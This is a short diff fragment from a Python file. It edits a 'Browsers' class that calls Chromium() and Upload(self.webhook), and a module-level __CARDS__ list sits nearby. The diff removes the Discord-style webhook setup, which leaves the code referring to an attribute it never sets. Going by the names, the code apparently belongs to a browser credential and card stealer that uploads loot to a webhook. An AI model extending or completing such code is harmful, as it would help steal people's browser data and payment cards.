@@ -18,9 +18,7 @@ __CARDS__ = []
 
 
 class Browsers:
-    def __init__(self, webhook):
-        self.webhook = SyncWebhook.from_url(webhook)
-
+    def __init__(self):
         Chromium()
         Upload(self.webhook)
 
